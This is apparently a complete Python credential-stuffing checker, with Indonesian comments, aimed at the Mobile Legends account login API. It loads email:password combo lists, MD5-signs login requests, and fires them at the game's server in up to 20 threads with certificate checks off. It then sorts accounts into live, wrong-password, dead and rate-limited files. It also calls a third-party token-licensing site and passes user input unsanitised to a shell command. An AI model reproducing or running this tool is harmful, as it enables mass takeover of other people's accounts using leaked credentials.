#SEMOGA_YANG_RECODE_MANDULL
import requests, os, random, sys, json, hashlib, time
from concurrent.futures import ThreadPoolExecutor
requests.packages.urllib3.disable_warnings()
print('''\033[0m
USERNAME >> \033[92mKLEAN
\033[0m SLOW
\n''')

# untuk ambil token ke elt
# klo bisa jangan di hapus yang ini
def get_tokens():
    try:
      file = open('token.txt', 'r')
      teks = file.read() 
      return teks
    except:exit("File token error")
token = get_tokens()

# untuk cek token ke elt
def cek_token(token):
    try:
      response_api = requests.get("https://eastlombok.site/restApi/cekKey.php?key="+token+"&tipe=amazonV3", headers={'User-Agent': 'Mozilla/5.0'})
      return response_api
    except: exit('Something error, try again\n')
cek_tokens = cek_token(token)  
if cek_tokens.status_code != 200:exit('Token is not valid')


# list untuk nyimpen data empas
userdata = []

empas = input(' \033[93mHapus result 033[0m[\033[92my/n\033[0m] >>  ')
if empas.lower() == 'y' :
  # hapus file
  open('result/Live.txt','w').write('')
  open('result/WRONG.txt','w').write('')
  open('result/Die.txt','w').write('')
  open('result/Unknown.txt','w').write('')
  open('result/Limit.txt','w').write('')
elif empas.lower() == 'n' :
  pass
else: exit('\n input yang bener.. :(')

empas = input(' \033[92mComboList\033[0m >> ')
print(" [*]Wait...")
# fungsi untuk menghapus list empas per line
os.system("php lib/func.php "+empas)
time.sleep(2)

# pengecekan empas dan pengembilan empas
if os.path.exists(
      empas
    ):
  for data in open( empas,'r',encoding='utf-8').readlines():
    try:
      user = data.strip().split(':')
      if user[0] and user[1]:
        em = user[0]
        pw = user[1]
        userdata.append({'email': em,'pw': pw,'userdata':':'.join([em,pw])})
    except: pass
  if len(userdata) == 0:
    exit('[!] Combo is empty')

# pembuatan data body dengan mengubahnya menjadi md5
def hash_md5(string):
    md5 = hashlib.new('md5')
    md5.update(string.encode('utf-8'))
    return md5.hexdigest()
# pembuatan data body yg siap di send ke server moonton
def build_params(user):

    md5pwd = hash_md5(
      user['pw']
    )
    hashed = hash_md5(
      "account="+user['email']+"&md5pwd="+md5pwd+"&op=login".format(
        user['email']+md5pwd)
    )

    return json.dumps({
      'op': 'login',
      'sign': hashed,
      'params': {
        'account': user['email'],
        'md5pwd': md5pwd,
      },
      'lang': 'cn'
    })
    
# fungsi untuk mengecek data empas dan mengeluarkan output
def check(user,opsi = 'y'):
  try:
    global empas
    
    headers = {
        'host': 'accountmtapi.mobilelegends.com',
        'user-agent': 'Mozilla/5.0',
        'x-requested-with': 'com.mobile.legends'
    }
    url = 'https://accountmtapi.mobilelegends.com/'
    datas = build_params(user)
    getData = requests.post(
      url, 
      data=datas,
      headers=headers,
      timeout=10,
      verify=False
      )
    # pengecekan apakah data ke send dengan benar daan server membalas dengan benar
    if getData.status_code == 200:
      x = getData.json()['message']
      
      # pengecekan setatus empas user
      if x == 'Error_NoAccount':
        print(
            '\r \033[0;31m[\033[0mDIEE\033[0;31m]\033[0m '+user[
              'userdata'
            ]+' [\033[7;31mWrong Email\033[0m]'
        )
        open('result/Die.txt','a').write(str(user
              [
                'userdata'
              ]
            )+'\n'
          )
        open("trash/cache.txt", "a").write(str(user['userdata'])+'\n')
      elif x == 'Error_Success':
        print(
            '\r \033[92m[\033[0mLIVE\033[92m]\033[0m '+user[
              'userdata'
             ]+' [\033[7;92mSuccess Login\033[0m]'
        )
        open('result/Live.txt','a').write(str(user
              [
                'userdata'
              ]
            )+'\n'
          )
        open("trash/cache.txt", "a").write(str(user['userdata'])+'\n')
      elif x == 'Error_PasswdError':
        print(
            '\r \033[0;93m[\033[0mWRONG\033[93m]\033[0m '+user[
              'userdata'
            ]+' [\033[7;93mWrong Password\033[0m]'
        )
        open('result/WRONG.txt','a').write(str(user
              [
                'userdata'
              ]
            )+'\n'
          )
        open("trash/cache.txt", "a").write(str(user['userdata'])+'\n')
      elif x == 'Error_PwdErrorTooMany':
        print(
            '\r \033[0;95m[\033[0mLimit\033[95m\]\033[0m '+user[
              'userdata'
            ]+' [\033[7;95mLimit Login\033[0m]'
        )
        open('result/LIMIT.txt','a').write(str(user
              [
                'userdata'
              ]
            )+'\n'
          )
        open("trash/cache.txt", "a").write(str(user['userdata'])+'\n')
      elif x == 'Error_InvalidAcount':
        print(
            '\r [\033[7;96mTRY again\033[0m] '+user[
              'userdata'
            ]+' [\033[7;96mGa Ke Detect\033[0m]'
        )
        open('result/Unknown.txt','a').write(str(user
              [
                'userdata'
              ]
            )+'\n'
          )
      print(
          end='\r [*] Checked By [\033[96m@DanuNihBoss\033[0m]',
          flush=True
        )
    else:
        pass
  except:
    pass
opsi = input( " \033[95mFast033[0m/\033[95mTidak \033[0m[\033[92my/n\033[0m] >>  " )
if opsi.lower() == "y" or opsi.lower() == "yes":
  with ThreadPoolExecutor(max_workers=20) as thread:
          [
            thread.submit(
              check,
              user
            ) for user in userdata
          ]
elif opsi.lower() == "n" or opsi.lower() == "no":
  for user in userdata:
    check(user, "n")
    time.sleep(0.1)
else : exit(' [*]pilih yang bener!')
